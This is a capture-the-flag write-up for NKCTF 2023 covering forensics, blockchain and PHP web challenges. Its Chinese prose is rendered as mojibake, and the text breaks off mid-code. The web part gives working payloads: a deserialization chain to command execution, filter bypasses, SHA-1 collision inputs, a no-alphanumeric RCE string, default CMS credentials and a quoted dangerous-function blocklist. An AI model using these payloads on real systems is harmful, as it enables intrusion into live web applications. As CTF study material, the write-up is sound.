<h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>èµ›åå¤ç°</strong></p>
<p>å…ˆåš<code>2023.3.2</code></p>
<p>çœ‹çš„å‡ºæ¥ï¼Œå‡ºé¢˜äººå¾ˆå–œæ¬¢æ˜æ–‡æ”»å‡»</p>
<p><a href="https://pcapng.com/">pcapngæ–‡ä»¶æ ¼å¼</a></p>
<p><code>echo &quot;4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF&quot; | xxd -r -ps &gt; plain.txt</code><br><code>bkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8</code><br><code>bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy</code></p>
<p>è§£å‹åå¾—åˆ°<code>tonF.docx</code>å’Œ<code>usb.pcapng</code></p>
<p>å¯¹æ•°æ®åŒ…åˆ†æï¼Œå‘ç°æ˜¯usbé”®ç›˜æµé‡ï¼Œä½¿ç”¨<code>UsbMiceDataHacker</code>æå–<br><code>PassWord:&lt;SPACE&gt;NKCTF2023_YYDS_YYDS!!!&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;</code></p>
<p>docxå¯†ç ä¸º<code>NKCTF2023_YYDS_YYDS!!!</code></p>
<p>è¿›å…¥æ–‡æ¡£åå‘ç°å­—ä½“ä¸º<code>Byxs20_font</code></p>
<p>ä¸”æ–‡æ¡£ä¸­çš„å†…å®¹å¤åˆ¶åä¸æ–‡æ¡£å†…ä¸ä¸€æ ·äº†</p>
<p><img src="/img/wp/2023/2023nkctf-21.png"></p>
<p>odttfè½¬ttf</p>
<p>æ‰“å¼€<code>/word/fontTable.xml</code>ï¼Œå¾—åˆ°<code>font-name</code>ä¸º<code>Byxs20_font</code>ï¼Œ<code>fontKey</code>ä¸º<code>&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;</code></p>
<p>å°†<code>\word\fonts\font1.odttf</code>é‡å‘½åä¸º<code>F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf</code></p>
<p>pythonè½¬æ¢</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># è·å–æ–‡ä»¶å</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># è·å–key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font1.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure>

<p>fontforgeè¯†åˆ«</p>
<p><img src="/img/wp/2023/2023nkctf-22.png"></p>
<p>å¾—åˆ°ä¸€åŠflagï¼š<code>nkctf&#123;ttf_is_funny_</code></p>
<p>æ¥ç€åš<code>2023.3.4</code></p>
<p>å†…å­˜å–è¯<br><code>python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;</code></p>
<p><img src="/img/wp/2023/2023nkctf-23.png"></p>
<p>æå–<code>PYTHON.rar</code></p>
<p><code>python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./</code></p>
<p><img src="/img/wp/2023/2023nkctf-24.png"></p>
<p>ç”¨è¿™ä¸ªå¯†é’¥æ¢å¤åŠ å¯†åˆ†åŒº</p>
<p><img src="/img/wp/2023/2023nkctf-25.png"></p>
<p>å¾—åˆ°<code>bitlocker_is_very_interesting&#125;</code></p>
<p>æœ€åçœ‹<code>2023.3.3</code></p>
<p>hintï¼š<code>flag2å›¾ç‰‡ååˆ†æœ‰è§„å¾‹çš„3x3ï¼Œåˆ°åº•æ˜¯æ¥è‡ªå‡ è¿›åˆ¶çš„ç§˜å¯†å‘¢ï¼Ÿ</code></p>
<p>æ ¹æ®æç¤º<code>3x3</code>ï¼ŒçŒœæµ‹æ˜¯4è¿›åˆ¶</p>
<p>exiftoolå¾—åˆ°æç¤º<code>ä¸ŠåŒ—ä¸‹å—å·¦è¥¿å³ä¸œ</code></p>
<p><img src="/img/wp/2023/2023nkctf-26.png"></p>
<p>pythonæå–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br>img = cv2.imread(<span class="hljs-string">&quot;./flag2.png&quot;</span>,cv2.IMREAD_UNCHANGED)<br><br>r,c = img.shape<br><br><span class="hljs-comment">#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]</span><br>flag2_xy = [(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)]<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r,<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,c,<span class="hljs-number">3</span>):<br>        roi_img = img[y: y+<span class="hljs-number">3</span>, x: x+<span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment">#for i in flag_xy:</span><br>        <span class="hljs-comment">#    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)</span><br><br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2_xy:<br>            tmp += <span class="hljs-built_in">str</span>(roi_img[i[::-<span class="hljs-number">1</span>]])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">4</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>flag2 is here: images_are_fun_</code></p>
<p>ä¸‰æ®µflagæ‹¼æ¥èµ·æ¥<code>NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;</code></p>
<h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>åŒºå—é“¾æµè§ˆå™¨æ‰“å¼€åœ°å€ï¼Œflagå­˜å‚¨åœ¨å˜é‡ä¸­ï¼Œåœ¨æ’æ§½ä¸­è½¬æ¢ç±»å‹ä¸ºtext</p>
<p><img src="/img/wp/2023/2023nkctf-27.png"></p>
<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>ncåå…ˆåˆ›å»ºéƒ¨ç½²é¢˜ç›®çš„åˆçº¦è´¦æˆ·<br>æ°´é¾™å¤´è½¬è´¦ï¼Œéƒ¨ç½²åˆçº¦</p>
<p>æŸ¥çœ‹åˆçº¦ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨<code>setGreeting</code>æ”¹<code>greeting</code>çš„å€¼å³å¯</p>
<p>åœ¨<code>metamask</code>ä¸­é“¾æ¥é¢˜ç›®ç»™çš„ç§é“¾</p>
<p><img src="/img/wp/2023/2023nkctf-28.png"></p>
<p>ä½¿ç”¨<code>remix ide</code></p>
<p>ç¼–è¯‘åæŒ‡å®šé¢˜ç›®éƒ¨ç½²çš„åœ°å€</p>
<p>è°ƒç”¨<code>setGreeting</code>ï¼Œå‚æ•°è¾“å‡ºå­—ç¬¦ä¸²<code>&quot;Hello,NKCTF2023&quot;</code></p>
<p><img src="/img/wp/2023/2023nkctf-29.png"></p>
<p>åœ¨Metamaskç¡®è®¤äº¤æ˜“è¯·æ±‚</p>
<p>ç­‰å¾…äº¤æ˜“æ‰“åŒ…ï¼Œç¡®è®¤ä¸Šé“¾</p>
<p><img src="/img/wp/2023/2023nkctf-30.png"></p>
<h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>ä¸ç¬¬ä¸€é¢˜ä¸€æ ·ï¼Œä¸è¿‡sha256åŠ å¯†äº†<br>åœ¨æä¾›çš„ç½‘ç«™ä¸Šè§£</p>
<p><img src="/img/wp/2023/2023nkctf-31.png"></p>
<p><code>NKCTF&#123;This_1s_Decompile_Rev3nge!!!!&#125;</code></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h2><p>ååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;oww!man!!&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;ItS SO CREAZY&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$string</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you are bad&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$cmd</span>);<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]))&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æœ€ç»ˆéœ€è¦åœ¨Happyç±»ä¸­æ‰§è¡Œevalï¼Œ<code>__invoke</code>åœ¨å°†å¯¹è±¡å½“ä½œå‡½æ•°æ¥ä½¿ç”¨æ—¶è°ƒç”¨æ­¤æ–¹æ³•ï¼Œåœ¨<code>Hell0</code>ç±»ä¸­å¯ä»¥è°ƒç”¨å‡½æ•°<code>$function()</code>ä»¥è§¦å‘<code>__invoke</code>ï¼Œè€Œè°ƒç”¨å‡½æ•°éœ€è¦è§¦å‘<code>__toString</code>æ–¹æ³•ï¼Œè€Œåœ¨<code>Welcome</code>ç±»ä¸­å­˜åœ¨<code>echo</code>ï¼Œå¯ä»¥è§¦å‘<code>__toString</code></p>
<p>ååºåˆ—åŒ–åä¼šæœ‰ä¸€ä¸ªwafæ–¹æ³•æ¥æ£€æŸ¥<code>$cmd</code>ä¸­çš„å€¼æ˜¯å¦å­˜åœ¨<code>f</code>,<code>l</code>,<code>a</code>,<code>g</code>,<code>*</code>,<code>?</code></p>
<p>åˆ—ç›®å½•ï¼š<code>dir /</code></p>
<p><code>O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:16:&quot;welcome_to_NKCTF&quot;;s:3:&quot;arg&quot;;O:5:&quot;Hell0&quot;:1:&#123;s:4:&quot;func&quot;;O:5:&quot;Happy&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:5:&quot;dir /&quot;;&#125;&#125;&#125;</code></p>
<p><img src="/img/wp/2023/2023nkctf-32.png"></p>
<p>è¯»<code>/f1ag</code>ï¼šä½¿ç”¨<code>gzdecode</code>ç¼–ç ç»•è¿‡</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//$cmd=&#x27;system(&quot;more /*&quot;);&#x27;;</span><br><span class="hljs-comment">//echo urlencode(gzencode($cmd));</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;welcome_to_NKCTF&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;Hell0&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Happy</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>=<span class="hljs-string">&#x27;gzdecode&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&#x27;%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00&#x27;</span>);<br>	&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hell0</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;Happy&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$a</span>-&gt;arg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hell0</span>();<br><span class="hljs-variable">$a</span>-&gt;arg-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Happy</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><code>O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A8%3A%22gzdecode%22%3Bs%3A3%3A%22cmd%22%3Bs%3A38%3A%22%1F%8B%08%00%00%00%00%00%00%0A%2B%AE%2C.I%CD%D5P%CA%CD%2FJU%D0%D7R%D2%B4%06%00%7B%96%1Bo%12%00%00%00%22%3B%7D%7D%7D</code></p>
<p><img src="/img/wp/2023/2023nkctf-33.png"></p>
<h2 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>] != (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>] != <span class="hljs-number">114514</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;e&#x27;</span>]) == <span class="hljs-number">114514</span>)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NS_CTF.go&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>                            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>                        &#125;<span class="hljs-keyword">else</span>&#123;<br>                            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!!&#x27;</span>);<br>                        &#125;<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!!&#x27;</span>);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!!&#x27;</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!!&#x27;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!!&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ç¬¬ä¸€å±‚md5å¼±æ¯”è¾ƒï¼Œä½¿ç”¨æ•°ç»„ç»•è¿‡<br><code>a[]=1&amp;b[]=2</code></p>
<p>ç¬¬äºŒå±‚sha1å¼ºæ¯”è¾ƒ<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p>
<p>ç¬¬ä¸‰å±‚æ•°å­—æ¯”è¾ƒç¼ºé™·ï¼Œä½¿ç”¨å°æ•°ç±»å‹<br><code>e=114514.20</code></p>
<p>ç¬¬å››å±‚phpå˜é‡å€¼ç‰¹æ€§ï¼Œä½¿ç”¨<code>[</code>ä»£æ›¿<code>_</code><br><code>NS[CTF.go</code></p>
<p>ç¬¬äº”å±‚æ— å­—æ¯æ•°å­—rceï¼Œä½¿ç”¨å–å<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p>
<h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>è®¿é—®åå°<code>/dede/</code>ï¼Œç”¨æˆ·å<code>admin</code>ï¼Œå¯†ç <code>admin</code></p>
<p>å·¦ä¾§æ ¸å¿ƒæ ä¸­æœ‰ä¸ªæ–‡ä»¶å¼ç®¡ç†å™¨ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶</p>
<p>å­˜åœ¨è¿‡æ»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ä¸å…è®¸è¿™äº›å­—ç¬¦</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMSæç¤ºï¼šå½“å‰é¡µé¢ä¸­å­˜åœ¨æ¶æ„ä»£ç ï¼&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span 